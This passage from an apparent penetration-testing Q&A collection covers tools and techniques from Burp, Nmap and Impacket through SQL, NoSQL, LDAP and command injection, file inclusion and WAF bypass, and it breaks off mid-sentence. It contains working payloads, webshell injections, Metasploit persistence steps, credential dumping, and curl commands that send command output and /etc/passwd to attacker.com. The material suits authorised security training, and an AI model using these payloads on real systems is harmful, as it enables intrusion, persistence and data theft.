(10) BeEF tunneling proxy: route attacker HTTP traffic through hooked browser -- use victim browser to access internal resources. OPSEC: BeEF hook.js visible in page source; sophisticated users may notice; loaded via inline script or remote script tag. Usage in engagements: demonstrates XSS impact beyond alert(1); show client real-world consequences of XSS; pivot to internal network discovery. Defense: CSP blocks hook.js loading from external domain; HttpOnly cookies; browser isolation; endpoint detection of hook.js patterns.
How do you use Burp Suite Professional for web application testing?

Burp Suite: leading web application security testing platform. Core components: Proxy: intercept and modify browser requests; configure browser to use Burp proxy (127.0.0.1:8080); install Burp CA certificate for HTTPS interception; match/replace rules for automated modifications. Target / Sitemap: crawled pages; add to scope; filter to focus testing. Scanner: automated vulnerability detection; active scan (sends attack payloads) and passive scan (analyses traffic without sending attacks); JavaScript analysis; smart scanning. Repeater: resend and modify individual requests; essential for manual exploitation; test parameter tampering; chain requests. Intruder: automated payload attacks; attack types: Sniper (one payload position), Battering Ram (same payload in all positions), Pitchfork (parallel payload lists), Cluster Bomb (all combinations); configure payload lists (wordlists, character fuzz, numbers); use for brute force, parameter fuzzing, IDOR enumeration, header injection. Comparer: diff two HTTP responses; useful for blind SQLi (compare responses for true/false conditions) and finding changes in responses. Decoder: encode/decode: URL, Base64, HTML entities, hex, binary, ASCII; compose multiple transforms. Sequencer: test randomness of session tokens; capture multiple tokens; statistical analysis; entropy score. Extensions (BApp Store): active scan extensions; Autorize (IDOR testing -- replay requests with different user tokens); JWT Editor; HTTP Request Smuggler; Hackvertor (encoding/obfuscation); Param Miner (hidden parameter discovery); CSRF Scanner; Retire.js (outdated JavaScript libraries); GQL Raider (GraphQL); Logger++ (advanced logging); Upload Scanner. Collaborator: out-of-band detection; unique subdomain (xxx.oastify.com) for DNS/HTTP/SMTP callbacks; detect blind SSRF, blind XXE, blind OS command injection; interactions tab shows who connected. Project files: save and reload entire testing session; professional feature; essential for long engagements.
What is OWASP ZAP and how does it differ from Burp Suite?

OWASP ZAP (Zed Attack Proxy): free, open-source web application security scanner; community-maintained by OWASP. Key features: Proxy: similar to Burp; intercept and modify requests; install CA certificate; configure browser. Active Scanner: sends attack payloads; detects SQLi, XSS, command injection, path traversal; less accurate than Burp Suite scanner; generates many false positives. Passive Scanner: analyses requests/responses for security issues without active attacks; low risk, safe on production. Spider: traditional web spider (follows links, forms) and Ajax Spider (executes JavaScript, crawls SPAs). HUD (Heads Up Display): in-browser overlay showing security findings while browsing; visual indicator on page. Fuzzer: customisable payload fuzzing similar to Burp Intruder; OWASP FuzzDB wordlists bundled. Script console: JRuby, Jython, JavaScript scripting; write custom scan rules, attacks, authentication scripts. Authentication: handle form-based, HTTP-basic, OAuth auth; maintain authenticated session during scan; detect when session expires. Automation: ZAP API; CI/CD integration; GitHub Actions ZAP scan action; OWASP ZAP Docker container (full scan, API scan, baseline scan modes); easily integrated into pipelines for automated security testing. Burp vs ZAP: Burp Professional: paid ($449/year per user); more accurate scanner; better extensibility; larger plugin ecosystem; preferred by professional pentesters; better Collaborator for OOB detection. ZAP: free; better for CI/CD integration (official Docker images, GitHub Actions); community-maintained; good for teams with budget constraints; automated scanning in pipelines. Both: proxy-based; similar core capabilities; both support modern web apps. DAST in CI/CD: ZAP commonly used in automated pipelines; triggered on every deployment to test environment; results parsed and converted to SARIF for GitHub Security tab or Jira tickets; gates deployment if Critical or High findings discovered.
How do you use Nmap for network discovery and security scanning?

Nmap: de-facto standard network scanner; host discovery, port scanning, service/version detection, OS detection, scripting. Host discovery: nmap -sn 192.168.1.0/24 (ping sweep -- no port scan; ARP on local network; ICMP + TCP SYN/ACK on remote); nmap -sn -PS80,443 192.168.1.0/24 (TCP SYN ping on port 80/443 -- works through firewalls that block ICMP). Port scanning techniques: TCP SYN scan (stealth): nmap -sS TARGET (requires root; sends SYN; RST after SYN-ACK -- never completes handshake; faster, less logged than full connect); TCP connect: nmap -sT TARGET (full 3-way handshake; does not require root; logged by applications); UDP scan: nmap -sU TARGET (slow; sends UDP packets; listens for ICMP port unreachable for closed ports or response for open); NULL/FIN/XMAS scans: nmap -sN/-sF/-sX (bypass some firewalls; not reliable on Windows). Port specification: nmap -p 80,443,8080 TARGET (specific ports); nmap -p 1-65535 TARGET (all ports); nmap -p- TARGET (all ports shorthand); nmap --top-ports 1000 TARGET (top 1000 most common ports). Service and version: nmap -sV TARGET (grab banners, identify service and version); nmap -sV --version-intensity 9 (max intensity, slower). OS detection: nmap -O TARGET (fingerprint OS from TCP/IP stack characteristics; requires root; unreliable through firewalls). Scripts: nmap --script=vuln TARGET (run all vulnerability scripts); nmap --script=safe TARGET (run safe scripts -- discovery only); nmap --script=smb-vuln-ms17-010 TARGET (check for EternalBlue); nmap --script=http-title,http-headers TARGET (web server info). Timing: -T0 (paranoid, very slow, evades IDS), -T1 (sneaky), -T2 (polite), -T3 (normal default), -T4 (aggressive, faster), -T5 (insane, may miss results). Output: nmap -oX output.xml TARGET (XML for import into Metasploit, Nessus); nmap -oN output.txt (normal text); nmap -oG output.grep (greppable); nmap -oA basename (all formats).
What is Wireshark and how do you use it for security analysis?

Wireshark: network protocol analyser; captures and dissects network packets in real-time or from PCAP files. Capture: select interface (eth0, wlan0, lo); capture filter (reduces captured traffic): host 192.168.1.1 (only traffic to/from IP); port 80 (HTTP only); not port 22 (exclude SSH); tcp (TCP only); net 192.168.1.0/24 (subnet). Stop capture; save as PCAP. Display filters (applied after capture; more powerful): ip.addr == 192.168.1.1; tcp.port == 80; http.request.method == GET; dns.qry.name contains google; tcp.flags.syn == 1 && tcp.flags.ack == 0 (SYN packets only -- port scan detection); http contains password (search HTTP bodies). Follow TCP stream: right-click packet > Follow > TCP Stream; reconstructs full conversation; useful for HTTP analysis, credential capture, malware traffic. Protocol dissection: Wireshark decodes 2000+ protocols; automatically detects protocol by port; HTTP headers visible; DNS query/response; TLS handshake (without decrypting payload). TLS decryption: import RSA private key (Preferences > Protocols > TLS > RSA keys) for RSA key exchange (legacy -- does not work with PFS); import TLS session keys (SSLKEYLOGFILE environment variable in browser/client -- logs session keys; Wireshark can import): Edit > Preferences > Protocols > TLS > (Pre)-Master-Secret log filename. Statistics: Conversations (all host pairs, byte counts, duration); Protocol Hierarchy (breakdown of protocols by percentage); IO Graphs (traffic over time); Expert Information (TCP retransmissions, errors, anomalies). Security use cases: capture and inspect malware C2 traffic; extract credentials from cleartext protocols (FTP, Telnet, HTTP basic auth); detect port scans (SYN flood to many ports); analyse malware PCAP from sandbox; detect data exfiltration (large outbound transfers, DNS tunneling -- high volume of DNS queries with long subdomain labels). Tshark: command-line Wireshark; tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri (extract HTTP URIs from PCAP).
How does the Metasploit persistence module work?

Metasploit persistence: after obtaining meterpreter shell, establish persistent access that survives reboots. run persistence -X -i 10 -p 4444 -r 192.168.1.50 (deprecated module but illustrative: -X=start on boot, -i=retry interval, -p=local port, -r=local host). Modern module: use post/windows/manage/persistence_exe; options: STARTUP (USER/SYSTEM/SCHEDULER); PAYLOAD_NAME; PATH for executable; SESSION for active meterpreter session. Mechanism: drops executable to disk (default %APPDATA%); adds registry run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run for user; HKLM for system -- requires admin); or creates scheduled task; executable phones home to handler at interval. Handler setup: auxiliary/multi/handler; set PAYLOAD matching persistence payload; set LHOST/LPORT; run -j (background); wait for connection when victim reboots. Stealthier persistence methods in real engagements: WMI subscriptions (post/windows/manage/wmi_persistence): no new files in obvious location; WMI event subscription runs PowerShell payload on trigger; harder to detect. Registry persistence: HKCU\...\Run key with base64-encoded PowerShell command; common and detectable. Startup folder: drop LNK or executable to shell:startup folder; user-space, no admin needed. Service: sc create + start; SYSTEM privileges if local admin; very persistent; but new service installation is logged. Powershell profile persistence: modify $PROFILE to run malicious command on every PowerShell launch; effective for environments with heavy PowerShell use. Scheduled task: schtasks /create ONLOGON trigger; evades simple run-key monitoring. Defence: persistence cleanup script on compromised hosts; baseline registry run keys; monitor new service installations; Autoruns (Sysinternals) for comprehensive persistence location review; EDR baseline and alert on new persistence locations.
Explain how to conduct a wireless network penetration test.

Wireless penetration test methodology: legal authorisation first; written permission including specific SSIDs and physical locations. Equipment: wireless adapter with monitor mode and packet injection capability (Alfa AWUS036ACH, AWUS036ACM -- Realtek or Atheros chipsets); external antenna for range; Kali Linux. Reconnaissance: airmon-ng start wlan0 (enable monitor mode; creates wlan0mon); airodump-ng wlan0mon (scan all channels; list APs with BSSID, channel, encryption, clients); airodump-ng wlan0mon --bssid TARGET_BSSID -c CHANNEL -w capture (focus on target, write capture). WPA2-Personal (PSK) attack: capture 4-way handshake: aireplay-ng -0 5 -a AP_BSSID -c CLIENT_MAC wlan0mon (deauth client 5 times; client reconnects -- handshake captured in airodump); hashcat -m 22000 capture.hc22000 rockyou.txt (WPA2 cracking; cap2hccapx or hcxtools to convert capture format); aircrack-ng capture.cap -w rockyou.txt (CPU-based, slower). PMKID attack (no client deauth needed): hcxdumptool -i wlan0mon -o output.pcapng --enable_status=1 (captures PMKID from AP without client); hcxpcapngtool output.pcapng -o hashfile.hc22000 (extract hashes); hashcat -m 22000 hashfile.hc22000 rockyou.txt. WEP attack (legacy, rare): IVs collection; aircrack-ng passively collects or actively injects; 50,000 IVs usually sufficient; aircrack-ng -b AP_BSSID capture.cap. WPA Enterprise (PEAP): evil twin attack with hostapd-wpe; capture MSCHAPv2 challenge-response; crack with asleap or hashcat; verify server certificate not enforced by client. Evil Twin: hostapd-wpe or airbase-ng creates rogue AP with same SSID; stronger signal than legitimate AP; clients associate; capture credentials. Post-access: WPA2 PSK cracked; connect to network; internal network scan; same as internal pentest from there. WPS PIN: wash -i wlan0mon (scan for WPS-enabled APs); reaver or bully (brute force WPS PIN -- 8 digits = 10^8 but split validation reduces to 11000 attempts); many APs have WPS lockout now. Report: include captured handshake evidence, crack time, recommendations: strong passphrase (20+ chars random), WPA3 upgrade, disable WPS.
How do you use Impacket for Windows and Active Directory attacks?

Impacket: Python library for network protocol manipulation; critical toolkit for Windows/AD penetration testing. Installation: pip install impacket or use Kali Linux (pre-installed). Key tools: smbclient.py: SMB client; list shares: smbclient.py domain/user:pass@TARGET; access share: use SHARE; ls; get file.txt. secretsdump.py: extract credentials remotely; requires domain admin or local admin: secretsdump.py domain/admin:pass@DC01 (DCSync automatically for DC; or dump SAM/LSA on regular host); output: username:RID:LM_HASH:NT_HASH::: format. psexec.py: remote command execution via service creation; requires admin SMB access: psexec.py domain/admin:pass@TARGET; or hash: psexec.py -hashes :NT_HASH domain/admin@TARGET cmd.exe; spawns SYSTEM shell. wmiexec.py: command execution via WMI; less noisy than psexec (no service installation); outputs via SMB file; wmiexec.py domain/admin:pass@TARGET. atexec.py: command execution via Task Scheduler; scheduled task created and deleted immediately; useful when SMB blocked. smbexec.py: reverse shell via SMB; avoids writing binary to disk. GetUserSPNs.py: Kerberoasting; GetUserSPNs.py domain/user:pass -dc-ip DC01 -request. GetNPUsers.py: AS-REP roasting; GetNPUsers.py domain/ -usersfile users.txt -no-pass. lookupsid.py: SID enumeration; bruteforce RIDs to enumerate users/groups: lookupsid.py domain/user:pass@TARGET. rpcdump.py: enumerate RPC interfaces; useful for lateral movement path analysis. reg.py: remote registry access; reg.py domain/admin:pass@TARGET query -keyName HKLM\SAM. mssqlclient.py: MSSQL client with xp_cmdshell support. ntlmrelayx.py: NTLM relay attacks (part of Impacket); see SMB relay section. ticketer.py: create Golden/Silver tickets from krbtgt or service hash.
What is CrackMapExec and how is it used for network pentesting?

CrackMapExec (CME / cme or crackmapexec): post-exploitation tool for Active Directory environments; automates credential testing and lateral movement across Windows networks. Basic credential spraying: cme smb 192.168.1.0/24 -u administrator -p Password123 (test credentials against all hosts in range); output shows + (success) or - (failure) per host; --continue-on-success (don't stop at first success). Hash spraying: cme smb 192.168.1.0/24 -u administrator -H NT_HASH (Pass-the-Hash against network). Protocol modules: smb, winrm, mssql, ldap, ssh, rdp, vnc, wmi, ftp; cme ldap DC01 -u admin -p pass --users (enumerate AD users); cme ldap DC01 -u admin -p pass --groups (enumerate groups); cme mssql 192.168.1.100 -u sa -p password --no-bruteforce (test MSSQL credentials). SMB enumeration: cme smb TARGET -u user -p pass --shares (list shares and permissions); cme smb TARGET -u user -p pass --sessions (list active sessions -- find domain admin sessions); cme smb TARGET -u user -p pass --loggedon-users (list logged on users -- find targets for credential theft); cme smb TARGET -u user -p pass --disks (list drives); cme smb TARGET -u user -p pass -M spider_plus (spider file shares looking for interesting files). Remote execution: cme smb TARGET -u admin -p pass -x ipconfig (execute command via wmiexec method); cme smb TARGET -u admin -p pass -X Get-Process (execute PowerShell); cme smb TARGET -u admin -p pass -M mimikatz (use mimikatz module to dump credentials). Database: --export (export results to CSV/JSON for reporting). LDAP attacks: cme ldap DC01 -u user -p pass --gmsa (dump gMSA passwords -- require ReadGMSAPassword permission); cme ldap DC01 -u user -p pass --bloodhound (collect BloodHound data). Modules: built-in modules (-M mimikatz, -M lsassy, -M nanodump for LSASS dumping; -M web_delivery for payload staging; -M kerberoast for Kerberoasting). OPSEC: all SMB connections visible in network logs; credential testing creates Event 4625 failures; --local-auth for local account testing avoids domain logs.
How do you perform OSINT (Open Source Intelligence) for a target?

OSINT methodology: gather information from publicly available sources before engagement. Domain and IP intelligence: WHOIS history: whois domain.com; ViewDNS.info for historical WHOIS; SecurityTrails API for passive DNS. DNS enumeration: dig domain.com ANY; dig _dmarc.domain.com TXT (email security posture); subfinder -d domain.com (passive subdomain from Certificate Transparency, VirusTotal, etc.); amass enum -passive -d domain.com; dnsx -l subdomains.txt -a (resolve to IPs); crt.sh: SELECT * FROM certificate WHERE san LIKE domain.com -- find all certs issued. IP ranges: ASN lookup (bgp.he.net or asn.cymru.com); find all IP ranges for organisation (whois -h whois.radb.net -- -i origin AS1234). Shodan/Censys: shodan host TARGET_IP; shodan search org:TargetCompany port:8080; Censys.io for similar capability; Fofa (Chinese version); find internet-exposed services. People and org intelligence: LinkedIn: employee names, roles, org chart reconstruction, tech stack from job postings; email format discovery from LinkedIn + Hunter.io (firstname.lastname@domain.com format). Hunter.io: find email addresses for a domain; verify email format; find specific employee emails. GitHub: github.com/target_company or github.com/employee_usernames; search for hardcoded secrets: truffleHog --github_user employee; GitHub search: org:company password; Grayhat Warfare (public S3 buckets). Google dorks: site:domain.com filetype:pdf (documents); site:domain.com ext:txt password; site:domain.com site:pastebin.com (pastes mentioning company); inurl:vpn.domain.com. Breach data: HaveIBeenPwned API (check employee emails in breaches); DeHashed (search by email/domain for breach data); IntelX (intelligence X -- dark web search engine). Social media: Twitter/X, Reddit, Glassdoor reviews (reveal internal tools, frustrations, incidents); job postings reveal technology stack, security gaps, upcoming projects. Maltego: graphical link analysis; combine sources; entity relationships; transforms for VirusTotal, Shodan, LinkedIn, DNS. Report: OSINT findings often reveal initial attack vector; list all discovered assets (subdomains, IP ranges); identify potentially exposed credentials; employee targets for spearphishing; technology stack for vulnerability research.
What security controls should be implemented for remote access?

Remote access security controls: (1) VPN hardening: multi-factor authentication (MFA) on VPN; certificate-based authentication preferred over username/password; update VPN software immediately when CVEs published (VPN vulns are top initial access vector for ransomware groups); restrict VPN to necessary IP ranges (not to entire corporate network); geo-IP blocking (if employees only in certain countries); alert on VPN login from new countries/IPs. (2) Zero Trust Network Access (ZTNA): replaces traditional VPN; identity and device posture verified before each application access; no implicit trust based on network location; applications not visible until authenticated; CrowdStrike Falcon Zero Trust, Zscaler ZPA, Palo Alto Prisma Access; even compromised VPN credential grants no lateral movement access. (3) Remote Desktop (RDP) security: never expose RDP directly to internet (port 3389 scanned constantly by attackers); use RDP Gateway (RDGW) or VPN first; network-level authentication (NLA) enabled; RDP credential guard; restrict who can RDP (limited AD group); RDP logging (Event 4778/4779 session connect/disconnect; 4624 Type 10 logon). (4) SSH hardening: disable password authentication (require SSH keys): PasswordAuthentication no in sshd_config; disable root login: PermitRootLogin no; use key exchange: only safe algorithms (curve25519-sha256, ecdh-sha2-nistp256); use AllowUsers/AllowGroups to restrict who can SSH; port-knock or single-packet authorisation (SPA) for hidden SSH; fail2ban for brute force protection; certificate-based SSH (SSH CA signs user certificates -- expiry, principal restrictions, audit trail). (5) Privileged access: PAM solution (CyberArk, BeyondTrust) for all remote privileged access; session recording; just-in-time access; no standing privileged access. (6) Conditional access: Azure AD/Okta Conditional Access policies; device compliance check (patch level, AV running, disk encryption); block access from unknown devices; location-based policies.
How does pentesting of ICS and OT environments differ from IT?

ICS/OT penetration testing: Industrial Control Systems (SCADA, DCS, PLCs) and Operational Technology environments require special care; availability is paramount (downtime = physical consequences). Key differences: Safety first: disruption can cause physical harm (power grid, water treatment, manufacturing, oil/gas); never test without explicit safety protocols; safety instrumented systems (SIS) are never targets; agree on immediate stop procedures. Passive-only approach often required: active scanning with Nmap may crash PLCs (they have limited resources; malformed packets cause device reboots); use passive traffic monitoring (Zeek, Wireshark) instead of active scanning; only active scan in maintenance windows with engineering team present. Protocols: Modbus (port 502): widely used in manufacturing PLCs; no authentication; read/write coils and registers directly; Modbus scanner: modscan, modbus-cli; Shodan finds thousands of internet-exposed Modbus devices. DNP3 (Distributed Network Protocol): used in electric utilities, water; no authentication in DNP3 Basic; unsolicited responses; DNP3 master can send control commands to RTUs. EtherNet/IP (port 44818): Allen-Bradley PLCs; CIP protocol; read/write tags; enip-scan. IEC 61850: substation automation; GOOSE messages (multicast, no auth). OPC UA: modern IPC; has security (certificates, authentication) but often misconfigured. OT network segmentation assessment: is IT network truly separated from OT? Data historian often bridges both; engineering workstations connect to both; check for flat network. Common findings: internet-exposed HMIs (Human Machine Interface); weak/default credentials on PLCs and HMIs (admin/admin; siemens/100); unencrypted protocols (Modbus, DNP3) on WAN links; Windows XP/Server 2003 systems running control software that cannot be patched; USB ports active on critical systems; anti-virus disabled because it interferes with real-time control. Standards: IEC 62443 (OT security standard); NIST SP 800-82 (Guide to ICS Security); NERC CIP (electric utility).
What are the different types of SQL injection?

SQL injection types: (1) In-band SQLi (most common): error-based and union-based; attacker sees results directly in response. Error-based: trigger database error that includes query results: AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) -- (MSSQL); extractvalue(1,concat(0x7e,(select version()))) (MySQL); error message includes database data. Union-based: append UNION SELECT to original query; retrieve data in normal response: UNION SELECT username,password,null FROM users-- ; must match column count (ORDER BY 1,2,3 to find column count); must match data types (NULLs for flexible typing). (2) Blind SQLi: no direct output visible; infer from response differences. Boolean-based: AND 1=1 (true condition -- normal response) vs AND 1=2 (false -- different response); extract data bit-by-bit: AND SUBSTRING(username,1,1)=a (true/false per character). Time-based: use database sleep/delay function: AND SLEEP(5) (MySQL) -- response delayed if injected; 1=1 delays 5s, 1=2 does not; extract data character by character with time delays. (3) Out-of-band SQLi: data exfiltrated via separate channel (DNS or HTTP request from database server): MySQL LOAD_FILE then UNC path (Windows only): SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,database(),0x2e,burpcollaborator,0x5c61)); Oracle UTL_HTTP to send data to attacker server; useful when no response difference visible. (4) Second-order injection: malicious input stored in database; injected later when retrieved and used in another SQL query without proper escaping; harder to detect with automated scanners. Databases: MySQL: INFORMATION_SCHEMA; -- comment; LIMIT; GROUP_CONCAT; SLEEP(5). MSSQL: sysobjects; -- comment; TOP; WAITFOR DELAY; xp_cmdshell. Oracle: ALL_TABLES; -- comment; ROWNUM; UTL_HTTP; DBMS_PIPE. PostgreSQL: pg_tables; -- comment; LIMIT; pg_sleep; COPY TO/FROM for file read/write. SQLite: sqlite_master; --; LIMIT; common in Android apps.
How do you find and exploit file inclusion vulnerabilities?

File inclusion vulnerabilities: web application includes files specified by user-controlled parameter. Local File Inclusion (LFI): server reads local file and includes it in response. Basic: http://target.com/page?file=../../../etc/passwd (path traversal); if successful: /etc/passwd contents in response. Bypassing filters: if filter strips../:....// (filter removes../ leaving../); %2e%2e%2f (URL encoding); %252e%252e%252f (double encoding);....%2f; PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd (base64 encode file content before output -- bypass PHP include restrictions); php://filter/read=string.rot13/resource=/etc/passwd. LFI to RCE: (1) Log poisoning: write PHP code into Apache/Nginx access log via malicious User-Agent: User-Agent: <?php system($_GET[cmd]);?>; then include log file: ?file=../../../../var/log/apache2/access.log&cmd=id; works if log file readable by web server user. (2) /proc/self/environ: include process environment file (often readable); inject PHP via User-Agent; include /proc/self/environ. (3) PHP session file: find PHP session file path (/var/lib/php/sessions/sess_SESSIONID); include session file; if session value contains PHP code (set via another parameter). (4) phpinfo() page: race condition; upload file via multipart form; file temporarily stored before processing; include temp file path from phpinfo() disclosing it. Remote File Inclusion (RFI): if allow_url_include=On in PHP configuration (disabled by default in PHP 5.2+): ?file=http://attacker.com/shell.php; server fetches and includes attacker file; RCE. Rare in modern PHP. Tools: LFISuite, Kadimus (automated LFI testing and exploitation); Burp Suite manual testing. Defence: whitelist allowed filenames; do not pass user input to include functions; chroot/open_basedir restriction; disable allow_url_include; sanitise path traversal sequences.
What is WAF (Web Application Firewall) and how do you bypass it?

WAF: security device that filters and monitors HTTP traffic to web applications; detects and blocks attacks (SQLi, XSS, command injection, path traversal). WAF bypass techniques: (1) Encoding: URL encoding: SELECT becomes %53%45%4C%45%43%54; double URL encoding: %2553; Unicode encoding: SELECT; hex encoding in SQL: 0x53454c454354. (2) Case variation: SeLeCt * FrOm uSeRs; WAF may only check lowercase patterns. (3) Comment insertion: SE/*comment*/LECT; SQL ignores comments; S/**/ELECT * FROM users; MySQL C-style comments. (4) Whitespace alternatives: %09 (tab), %0a (newline), %0d (carriage return), %0c (form feed); SELECT%09FROM%09users instead of spaces. (5) Version-based comments: /*!50000SELECT*/ (MySQL executes if version >= 5.0.00; bypasses WAFs that don't understand MySQL version comments). (6) HTTP parameter pollution: ?param=1&param=SELECT (some WAFs check first occurrence; backend uses last or concatenates). (7) Chunked transfer encoding: send payload in chunks; some WAFs only inspect first chunk. (8) HTTP request smuggling: use TE/CL discrepancy to bypass WAF inspection. (9) Protocol-level bypass: WAF expects HTTP/1.1; send HTTP/0.9 request; WebSocket upgrade; gzip compressed body not decoded by WAF. (10) Rate limiting bypass: distribute requests across multiple IPs; WAF rate limits per-IP. (11) Payload fragmentation: split XSS payload across multiple parameters; reassembled by server-side code. (12) Out-of-character sets: MySQL allows backtick as identifier quoting; `users` instead of users. Testing: send known payloads; observe WAF response (403, custom block page, different status code or body); iterate encodings and variations until WAF does not block; Burp Suite Intruder for automated bypass attempts; WAFfle, WAFNinja, bypass-firewalls-by-DNS-history, and Wfuzz for automation. Caution: WAF bypass alone is not a vulnerability; the underlying application must also be vulnerable.
How do you approach HTTP header injection testing?

HTTP header injection: attacker injects newline characters (CRLF -- 
) into HTTP response headers; allows adding arbitrary headers to response. How it works: web application reflects user input in HTTP response header without sanitisation: Set-Cookie: lang=USERINPUT; if USERINPUT = en
Set-Cookie: session=attacker_value; response now contains two Set-Cookie headers. Finding CRLF injection: inject 
 (%0d%0a), 
 (%0a) into headers reflected in response (Location, Set-Cookie, Content-Type reflected parameters); Burp: search response for injected newlines; tool: CRLFuzz. Impact: HTTP response splitting: inject 

 to end headers; inject arbitrary response body; inject HTML/JavaScript = stored XSS via header; inject into redirect headers. Cache poisoning: inject Cache-Control: public, max-age=86400; cache stores attacker-controlled response. Cookie injection: inject Set-Cookie header with attacker-controlled session or authentication bypass. XSS: inject Content-Type: text/html

<script>alert(1)</script>; server returns HTML response instead of expected content type. Host header injection: if application uses Host header for URL construction (password reset links, redirects) without validation: inject Host: attacker.com; password reset email contains link to attacker.com; victim clicks; attacker captures token. Similar attacks on other headers: X-Forwarded-For injection: if application trusts X-Forwarded-For for IP-based access control: inject X-Forwarded-For: 127.0.0.1 to bypass localhost-only restrictions. X-Forwarded-Host: if used for URL construction without validation: open redirect or XSS. Defence: sanitise user input before placing in response headers; remove newline characters (, 
); use framework functions for setting cookies and headers (they handle encoding); validate Host header against whitelist of allowed values.
How do you exploit NoSQL injection vulnerabilities?

NoSQL injection: attack NoSQL databases (MongoDB, CouchDB, Redis) by manipulating query operators. MongoDB injection: MongoDB queries use JSON-like operators ($where, $gt, $regex, $ne, $in); if application builds queries with user input: find({username: INPUT, password: INPUT}); inject operators. Authentication bypass: POST body: {username: admin, password: {$ne: null}}; in URL: ?username=admin&password[$ne]=null; PHP: $_POST[password] = array($ne => null) -- MongoDB query becomes {username: admin, password: {$ne: null}} -- matches any password not null = all users. Extracting data: {$regex: ^a} -- username starts with a (true/false enumeration); {$where: this.username==admin} -- JavaScript injection in $where operator. PHP HTTP parameter pollution for operators: password[$gt]=z (password greater than z -- bypasses some checks). Blind injection: use boolean operators to extract data character by character: regex enumeration of all usernames; similar to blind SQLi but with MongoDB syntax. Redis injection: if application passes user input to EVAL or raw commands; CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET key <?php system($_GET[cmd]);?>; BGSAVE -- writes webshell to disk; if SSRF reaches Redis: gopher:// protocol to send raw Redis commands. CouchDB: REST API; Mango query injection if parameters not validated; admin party (all admin access with no authentication -- default in old versions). LDAP injection: LDAP filters use () | & ! * syntax; login filter: (&(uid=USER)(password=PASS)); inject: USER=*)(uid=*))(|(uid=* -- filter becomes (&(uid=*)(uid=*))(|(uid=*)(password=PASS)) -- always true authentication bypass. Defence: parameterise all queries; input validation; reject arrays/objects in fields expecting strings; use ODM (Object Document Mapper) to abstract queries; NoSQL database authentication and network-level access control.
What is command injection and how do you find it?

Command injection (OS command injection): web application passes user input to system shell command; attacker injects additional commands. Basic: application runs: ping -c 4 USER_INPUT; inject: 8.8.8.8; id or 8.8.8.8$(id) or 8.8.8.8`id`; server executes ping then id; output of id returned. Shell metacharacters: semicolon (;) -- command separator; pipe (|) -- pipe output; && -- run second command if first succeeds; || -- run if first fails; backtick (`) or $() -- command substitution; newline (%0a) -- new command. Contexts: URL: http://target.com/ping?host=8.8.8.8|id; JSON body: {host: 8.8.8.8;id}; file name in upload: filename=test.pdf;id.pdf (if filename passed to shell); HTTP headers (User-Agent, Referer used in log processing or reporting). Blind command injection: no output visible; use out-of-band: ping -c 1 attacker.com (DNS lookup confirms execution); curl http://attacker.com/$(id) (exfiltrate output via DNS/HTTP); time-based: 8.8.8.8; sleep 10 (response delayed 10s confirms injection). Advanced exfiltration: whoami | base64 | curl -d @- http://attacker.com/data (base64 encode and POST output); curl http://attacker.com/$(cat /etc/passwd | base64 | tr + - | tr / _) (send in URL path). Language-specific sinks: Python: os.system(), subprocess.call(), os.popen(); PHP: exec(), shell_exec(), system(), passthru(), popen(), backtick operator (`cmd`); Java: Runtime.exec(), ProcessBuilder; Node.js: exec(), execSync(), spawn(); Ruby: system(), exec(), backtick. Finding: fuzz all parameters with shell metacharacters; sleep for time-based blind; Burp active scanner; Commix (automated command injection detection and exploitation tool). Defence: avoid shell execution entirely; if needed: parameterise commands (subprocess with list, not string); validate against allowlist (only alphanumeric IPs, no shell chars); run with minimal OS privileges; sandboxing; language-specific safe execution APIs.
How do you test for LDAP injection vulnerabilities?

LDAP injection: attacker manipulates LDAP (Lightweight Directory Access Protocol) queries via unsanitised input; exploits LDAP filter syntax. LDAP filter syntax: (objectClass=user); (uid=john); (&(uid=john)(password=secret)); (|(uid=admin)(uid=root)); special chars: () * \ NUL 0x00. Basic authentication bypass: login filter: (&(uid=USERNAME)(password=PASSWORD)); inject: USERNAME = *)(uid=*))(|(uid=* and any password; reconstructed filter: (&(uid=*)(uid=*))(|(uid=*)(password=injected)) -- wildcard matches all users = authentication bypass. Wildcard enumeration: if application uses LDAP search and returns results: inject * in username field; if application returns multiple results or different error for valid username: enumerate valid usernames with character-by-character refinement: a*, b*,...z*; then aa*, ab*, etc. Blind LDAP injection: different responses for valid vs invalid username; enumerate users one character at a time via boolean-based technique (similar to blind SQL injection). LDAP attribute extraction: if output of LDAP search shown: inject additional filter to retrieve other attributes: uid=admin)(objectClass=* returns all attributes of admin object. LDAP injection in other contexts: directory enumeration if injection in search filter; attribute injection if injection in distinguished name (DN) modification; password reset filter injection. Microsoft Active Directory LDAP: same injection principles apply; AD uses LDAP for authentication queries; ADFS authentication can be vulnerable. Testing: inject special chars into login fields: * \ () null; observe error messages or response differences; Burp Suite manual testing; LDAPi (LDAP injection testing tool). Defence: parameterise LDAP queries (use LDAP SDK methods that accept separate filter parameters, not string concatenation); escape special characters in user input before including in filter; allowlist validation (usernames should only be alphanumeric + specific chars); use service accounts with minimal LDAP permissions.
What are path traversal vulnerabilities and how do you find them?

Path traversal (directory traversal): attacker reads files outside the intended directory by manipulating file path parameters. Basic: application loads files: http://target.com/page?file=report.pdf; stored as /var/www/files/report.pdf; inject: ?file=../../../etc/passwd; application reads /var/www/files/../../../etc/passwd = /etc/passwd; if response includes /etc/passwd content: confirmed. Payloads:../../../etc/passwd (Linux);..\..\..\Windows\System32\drivers\etc\hosts (Windows); URL encoding: %2e%2e%2f or %2e%2e/ or..%2f or..%5c; double encoding: %252e%252e%252f; path normalisation bypass:....// or..../. Interesting files (Linux): /etc/passwd (user list); /etc/shadow (password hashes -- requires root); /proc/self/environ (process environment -- may contain secrets); /proc/self/cmdline (command that launched process); /etc/hosts; /var/log/apache2/access.log or /var/log/nginx/access.log; application config files; SSH keys (~/.ssh/id_rsa, /root/.ssh/id_rsa); /etc/ssh/sshd_config; web application source code and config. Windows targets: C:\Windows\System32\drivers\etc\hosts; C:\Windows\win.ini; C:\Windows\System32\config\SAM (requires admin and offline -- not via web traversal typically); web application config files; IIS: C:\inetpub\wwwroot\web.config. Finding path traversal: fuzz all parameters that appear to reference files or paths; try various depth combinations (../../ vs../../../); test with known file (/etc/hostname on Linux for simple confirmation); Burp active scanner; DotDotPwn (path traversal fuzzer with many bypass variants). Absolute path injection: if application accepts absolute paths: 